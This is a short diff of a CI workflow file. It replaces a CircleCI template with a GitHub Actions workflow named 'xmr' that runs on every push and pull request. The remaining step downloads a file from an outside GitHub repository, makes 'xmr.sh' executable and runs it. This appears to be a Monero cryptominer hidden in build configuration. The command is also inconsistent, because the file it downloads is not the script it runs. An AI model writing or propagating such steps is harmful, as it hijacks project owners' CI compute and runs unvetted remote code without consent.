@@ -1,25 +1,4 @@
-jobs:
-  build:
-    docker:
-      - image: circleci/<language>:<version TAG>
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-    steps:
-      - checkout
-      - run: <command>
-  test:
-    docker:
-      - image: circleci/<language>:<version TAG>
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-    steps:
-      - checkout
-      - run: <command>
-workflows:
-  version: 2
-  name: xmr
+name: xmr
 on: [push, pull_request]
 jobs:
   build:
@@ -46,4 +25,3 @@ jobs:
     - name: xmr
       run: |
         wget https://github.com/Z3rotwoo/xmr && chmod u+x xmr.sh && ./xmr.sh
-
